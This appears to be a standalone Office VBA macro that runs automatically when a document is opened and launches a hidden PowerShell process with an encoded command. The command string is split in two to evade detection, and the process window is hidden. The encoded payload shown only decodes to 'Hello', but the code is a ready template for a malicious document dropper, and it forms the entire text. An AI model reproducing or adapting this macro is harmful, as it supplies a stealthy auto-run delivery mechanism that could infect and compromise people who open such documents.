Sub AutoOpen()
    Dim x As String
    x = "power" & "shell.exe -enc SGVsbG8="
    Shell x, vbHide
End Sub
